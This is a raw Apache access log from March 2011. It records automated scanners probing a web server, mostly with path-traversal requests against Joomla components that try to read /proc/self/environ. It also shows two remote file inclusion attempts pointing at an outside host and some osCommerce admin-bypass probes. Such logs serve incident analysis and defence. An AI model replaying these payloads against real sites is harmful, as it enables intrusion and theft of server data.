217.16.8.81 - - [21/Mar/2011:20:52:44 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.8.81 - - [21/Mar/2011:20:52:45 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.8.81 - - [21/Mar/2011:20:52:48 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.8.81 - - [21/Mar/2011:20:52:48 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.8.81 - - [21/Mar/2011:20:52:53 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.8.81 - - [21/Mar/2011:20:52:57 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.8.81 - - [21/Mar/2011:20:52:58 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.8.81 - - [21/Mar/2011:20:53:02 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:20:54:08 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:20:54:30 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.23.35.111 - - [21/Mar/2011:21:02:33 +0900] "GET /?index.php2?option=com_ckforms&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 200 954
222.231.63.26 - - [21/Mar/2011:21:03:16 +0900] "GET //index.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
67.210.98.205 - - [21/Mar/2011:21:04:28 +0900] "GET /////index.php?option=com_juser&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 219
206.57.22.254 - - [21/Mar/2011:21:05:06 +0900] "GET /?option=com_realtyna&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 200 954
76.97.16.122 - - [21/Mar/2011:21:07:36 +0900] "GET //index.php?option=com_shoutbox&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
203.170.83.145 - - [21/Mar/2011:21:08:17 +0900] "GET /?option=com_realtyna&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 200 954
203.170.83.145 - - [21/Mar/2011:21:08:25 +0900] "GET /?option=com_realtyna&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 200 954
76.97.16.122 - - [21/Mar/2011:21:08:51 +0900] "GET //index.php?option=com_shoutbox&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
88.191.75.19 - - [21/Mar/2011:21:09:16 +0900] "GET //index.php?option=com_juser&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
211.115.89.131 - - [21/Mar/2011:21:14:01 +0900] "GET /?option=com_ckforms&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 200 954
217.16.3.142 - - [21/Mar/2011:21:14:30 +0900] "GET //index.php?option=com_properties&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:21:14:30 +0900] "GET //index.php?option=com_properties&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
211.115.89.131 - - [21/Mar/2011:21:14:30 +0900] "GET /?option=com_ckforms&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 200 954
194.107.127.51 - - [21/Mar/2011:21:15:04 +0900] "GET /?option=com_jvehicles&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 200 954
174.123.172.82 - - [21/Mar/2011:21:22:48 +0900] "GET /*.php?option=com_gcalendar&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 211
217.160.239.186 - - [21/Mar/2011:21:24:22 +0900] "GET /*.php?option=com_gcalendar&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 211
217.16.8.81 - - [21/Mar/2011:21:24:23 +0900] "GET //index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.8.81 - - [21/Mar/2011:21:24:39 +0900] "GET //index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
67.210.98.205 - - [21/Mar/2011:21:24:44 +0900] "GET /access_log.last/////index.php?option=com_juser&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 235
67.210.98.205 - - [21/Mar/2011:21:24:44 +0900] "GET /////index.php?option=com_juser&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 219
217.16.8.81 - - [21/Mar/2011:21:24:45 +0900] "GET //index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.8.81 - - [21/Mar/2011:21:24:54 +0900] "GET //index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
68.71.33.122 - - [21/Mar/2011:21:24:55 +0900] "GET /*.php?option=com_gcalendar&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 211
217.16.8.81 - - [21/Mar/2011:21:25:08 +0900] "GET //index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.8.81 - - [21/Mar/2011:21:25:09 +0900] "GET //index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.8.81 - - [21/Mar/2011:21:25:31 +0900] "GET //index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
178.131.1.247 - - [21/Mar/2011:21:25:45 +0900] "GET //index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:21:25:47 +0900] "GET //index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
67.210.98.205 - - [21/Mar/2011:21:25:54 +0900] "GET /access_log.last/////index.php?option=com_juser&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 235
67.210.98.205 - - [21/Mar/2011:21:25:55 +0900] "GET /////index.php?option=com_juser&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 219
70.32.104.240 - - [21/Mar/2011:21:26:26 +0900] "GET /?option=com_jvehicles&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 200 954
217.16.3.142 - - [21/Mar/2011:21:26:42 +0900] "GET //index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
112.216.153.186 - - [21/Mar/2011:21:27:26 +0900] "GET /access_log.last//index2.php?option=com_ganalytics&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 233
112.216.153.186 - - [21/Mar/2011:21:27:26 +0900] "GET //index2.php?option=com_ganalytics&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
174.123.172.82 - - [21/Mar/2011:21:28:22 +0900] "GET /*.php?option=com_gcalendar&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 211
178.131.1.247 - - [21/Mar/2011:21:28:37 +0900] "GET //index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
178.131.1.247 - - [21/Mar/2011:21:35:30 +0900] "GET //index.php?option=com_userstatus&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:21:37:30 +0900] "GET //index.php?option=com_userstatus&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
178.131.1.247 - - [21/Mar/2011:21:37:57 +0900] "GET //index.php?option=com_userstatus&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:21:38:06 +0900] "GET //index.php?option=com_userstatus&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
95.229.208.133 - - [21/Mar/2011:21:44:27 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
95.229.208.133 - - [21/Mar/2011:21:44:33 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
178.131.1.247 - - [21/Mar/2011:21:47:14 +0900] "GET //index.php?option=com_econtent&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:21:57:28 +0900] "GET //index.php?option=com_jvehicles&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
178.131.1.247 - - [21/Mar/2011:21:58:20 +0900] "GET //index.php?option=com_jvehicles&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:21:58:45 +0900] "GET //index.php?option=com_jvehicles&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:21:59:50 +0900] "GET //index.php?option=com_jvehicles&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:21:59:54 +0900] "GET //index.php?option=com_jvehicles&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
178.131.1.247 - - [21/Mar/2011:22:00:18 +0900] "GET //index.php?option=com_jvehicles&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:22:01:40 +0900] "GET //index.php?option=com_shoutbox&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
98.100.212.162 - - [21/Mar/2011:22:01:46 +0900] "GET /?option=com_ckforms&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 200 954
187.61.61.182 - - [21/Mar/2011:22:03:51 +0900] "GET //index.php?option=com_mscomment&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
91.121.64.167 - - [21/Mar/2011:22:06:56 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
91.121.64.167 - - [21/Mar/2011:22:07:13 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:22:07:29 +0900] "GET //index.php?option=com_joomlapicasa2&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:22:07:35 +0900] "GET //index.php?option=com_joomlapicasa2&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:22:08:02 +0900] "GET //index.php?option=com_shoutbox&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.23.8.216 - - [21/Mar/2011:22:08:04 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
74.54.184.50 - - [21/Mar/2011:22:08:07 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
74.54.184.50 - - [21/Mar/2011:22:08:11 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
173.236.201.197 - - [21/Mar/2011:22:08:54 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
91.121.64.167 - - [21/Mar/2011:22:09:00 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.8.216 - - [21/Mar/2011:22:09:01 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
178.131.1.247 - - [21/Mar/2011:22:09:14 +0900] "GET //index.php?option=com_joomlapicasa2&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
174.36.195.230 - - [21/Mar/2011:22:09:37 +0900] "GET //index.php?option=com_sebercart&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
80.38.87.254 - - [21/Mar/2011:22:10:50 +0900] "GET //index.php?option=com_mscomment&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:22:11:31 +0900] "GET //index.php?option=com_joomlapicasa2&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:22:11:38 +0900] "GET //index.php?option=com_joomlapicasa2&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
46.182.3.34 - - [21/Mar/2011:22:11:40 +0900] "GET //index.php?option=com_sebercart&view=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
178.131.1.247 - - [21/Mar/2011:22:13:38 +0900] "GET //index.php?option=com_joomlapicasa2&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
85.214.123.169 - - [21/Mar/2011:22:14:11 +0900] "GET /powered%20by%20os%20commerce%20.de HTTP/1.1" 404 232
98.100.212.162 - - [21/Mar/2011:22:16:44 +0900] "GET /access_log.last/?option=com_ckforms&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 222
98.100.212.162 - - [21/Mar/2011:22:16:45 +0900] "GET /?option=com_ckforms&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 200 954
216.119.135.66 - - [21/Mar/2011:22:19:37 +0900] "GET //index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
216.119.135.66 - - [21/Mar/2011:22:19:39 +0900] "GET //index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
85.114.140.99 - - [21/Mar/2011:22:19:47 +0900] "GET /access_log.last/contact/contact.php?input_file=http://www.magmareport.com//satu.txt??? HTTP/1.1" 404 241
85.114.140.99 - - [21/Mar/2011:22:19:47 +0900] "GET /contact/contact.php?input_file=http://www.magmareport.com//satu.txt??? HTTP/1.1" 404 225
98.100.212.162 - - [21/Mar/2011:22:19:51 +0900] "GET /access_log.last/?option=com_ckforms&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 222
98.100.212.162 - - [21/Mar/2011:22:19:52 +0900] "GET /?option=com_ckforms&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 200 954
216.119.135.66 - - [21/Mar/2011:22:19:55 +0900] "GET //index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
95.171.126.17 - - [21/Mar/2011:22:20:33 +0900] "POST /contact.php HTTP/1.1" 404 217
95.171.126.17 - - [21/Mar/2011:22:20:33 +0900] "POST /access_log.last/contact.php HTTP/1.1" 404 233
98.100.212.162 - - [21/Mar/2011:22:22:13 +0900] "GET /?option=com_ckforms&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 200 954
98.100.212.162 - - [21/Mar/2011:22:22:38 +0900] "GET /?option=com_ckforms&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 200 954
98.100.212.162 - - [21/Mar/2011:22:22:43 +0900] "GET /?option=com_ckforms&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 200 954
98.100.212.162 - - [21/Mar/2011:22:22:45 +0900] "GET /?option=com_ckforms&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 200 954
122.201.80.95 - - [21/Mar/2011:22:24:32 +0900] "GET //index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
122.201.80.95 - - [21/Mar/2011:22:24:39 +0900] "GET //index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
218.146.252.33 - - [21/Mar/2011:22:24:54 +0900] "GET //index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
218.146.252.33 - - [21/Mar/2011:22:24:58 +0900] "GET //index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
217.16.3.142 - - [21/Mar/2011:22:26:36 +0900] "GET //index.php?option=com_svmap&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:22:26:36 +0900] "GET //index.php?option=com_svmap&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
178.131.1.247 - - [21/Mar/2011:22:27:49 +0900] "GET //index.php?option=com_svmap&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
93.125.99.4 - - [21/Mar/2011:22:28:23 +0900] "GET /access_log/admin/categories.php/login.php?cPath=&action=new_product_preview HTTP/1.1" 404 247
93.125.99.4 - - [21/Mar/2011:22:28:24 +0900] "GET /admin/categories.php/login.php?cPath=&action=new_product_preview HTTP/1.1" 404 236
174.36.195.230 - - [21/Mar/2011:22:29:29 +0900] "GET //index.php?option=com_alphauserpoints&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
93.125.99.4 - - [21/Mar/2011:22:30:25 +0900] "GET /access_log/admin/file_manager.php/login.php HTTP/1.1" 404 249
93.125.99.4 - - [21/Mar/2011:22:30:26 +0900] "GET /admin/file_manager.php/login.php HTTP/1.1" 404 238
76.97.16.122 - - [21/Mar/2011:22:30:38 +0900] "GET //index.php?option=com_shoutbox&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
77.79.81.228 - - [21/Mar/2011:22:31:06 +0900] "GET //index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
77.79.81.228 - - [21/Mar/2011:22:31:19 +0900] "GET //index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
178.131.1.247 - - [21/Mar/2011:22:31:55 +0900] "GET //index.php?option=com_shoutbox&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:22:33:20 +0900] "GET //index.php?option=com_shoutbox&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:22:33:27 +0900] "GET //index.php?option=com_shoutbox&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
178.131.1.247 - - [21/Mar/2011:22:35:14 +0900] "GET //index.php?option=com_shoutbox&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.23.245.128 - - [21/Mar/2011:22:35:58 +0900] "GET /access_log.last//index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
94.23.245.128 - - [21/Mar/2011:22:35:59 +0900] "GET //index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.245.128 - - [21/Mar/2011:22:36:12 +0900] "GET //index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.245.128 - - [21/Mar/2011:22:36:20 +0900] "GET //index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.245.128 - - [21/Mar/2011:22:36:24 +0900] "GET //index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.245.128 - - [21/Mar/2011:22:36:25 +0900] "GET //index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.245.128 - - [21/Mar/2011:22:36:31 +0900] "GET /access_log.last//index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
94.23.245.128 - - [21/Mar/2011:22:36:31 +0900] "GET //index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.245.128 - - [21/Mar/2011:22:36:31 +0900] "GET /access_log.last//index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
94.23.245.128 - - [21/Mar/2011:22:36:32 +0900] "GET //index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.245.128 - - [21/Mar/2011:22:36:34 +0900] "GET /access_log.last//index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
94.23.245.128 - - [21/Mar/2011:22:36:34 +0900] "GET //index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.245.128 - - [21/Mar/2011:22:36:35 +0900] "GET /access_log.last//index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
94.23.245.128 - - [21/Mar/2011:22:36:35 +0900] "GET //index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.245.128 - - [21/Mar/2011:22:36:37 +0900] "GET /access_log.last//index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
94.23.245.128 - - [21/Mar/2011:22:36:37 +0900] "GET /access_log.last//index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
94.23.245.128 - - [21/Mar/2011:22:36:37 +0900] "GET //index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.245.128 - - [21/Mar/2011:22:36:37 +0900] "GET //index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.245.128 - - [21/Mar/2011:22:36:39 +0900] "GET /access_log.last//index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
94.23.245.128 - - [21/Mar/2011:22:36:40 +0900] "GET //index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.245.128 - - [21/Mar/2011:22:36:43 +0900] "GET /access_log.last//index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
94.23.245.128 - - [21/Mar/2011:22:36:43 +0900] "GET //index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.245.128 - - [21/Mar/2011:22:36:44 +0900] "GET /access_log.last//index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
94.23.245.128 - - [21/Mar/2011:22:36:45 +0900] "GET //index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.245.128 - - [21/Mar/2011:22:36:45 +0900] "GET /access_log.last//index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
94.23.245.128 - - [21/Mar/2011:22:36:45 +0900] "GET /access_log.last//index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
94.23.245.128 - - [21/Mar/2011:22:36:45 +0900] "GET /access_log.last//index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
94.23.245.128 - - [21/Mar/2011:22:36:45 +0900] "GET //index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.245.128 - - [21/Mar/2011:22:36:45 +0900] "GET //index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.245.128 - - [21/Mar/2011:22:36:45 +0900] "GET //index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.245.128 - - [21/Mar/2011:22:36:46 +0900] "GET /access_log.last//index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
94.23.245.128 - - [21/Mar/2011:22:36:47 +0900] "GET /access_log.last//index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
94.23.245.128 - - [21/Mar/2011:22:36:47 +0900] "GET //index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.245.128 - - [21/Mar/2011:22:36:47 +0900] "GET //index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.245.128 - - [21/Mar/2011:22:37:04 +0900] "GET /access_log.last//index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
94.23.245.128 - - [21/Mar/2011:22:37:05 +0900] "GET //index.php?option=com_jacomment&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:22:42:18 +0900] "GET //index.php?option=com_shoutbox&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
67.212.185.202 - - [21/Mar/2011:22:44:27 +0900] "GET /?option=com_wgpicasa&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 200 954
87.106.182.143 - - [21/Mar/2011:22:45:02 +0900] "GET /access_log.last/?option=com_ccnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 222
87.106.182.143 - - [21/Mar/2011:22:45:04 +0900] "GET /?option=com_ccnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 200 954
87.106.182.143 - - [21/Mar/2011:22:45:05 +0900] "GET /access_log.last/?option=com_ccnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 222
87.106.182.143 - - [21/Mar/2011:22:45:05 +0900] "GET /?option=com_ccnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 200 954
91.121.64.167 - - [21/Mar/2011:22:46:08 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
91.121.64.167 - - [21/Mar/2011:22:46:43 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
91.121.64.167 - - [21/Mar/2011:22:47:09 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.8.216 - - [21/Mar/2011:22:47:13 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
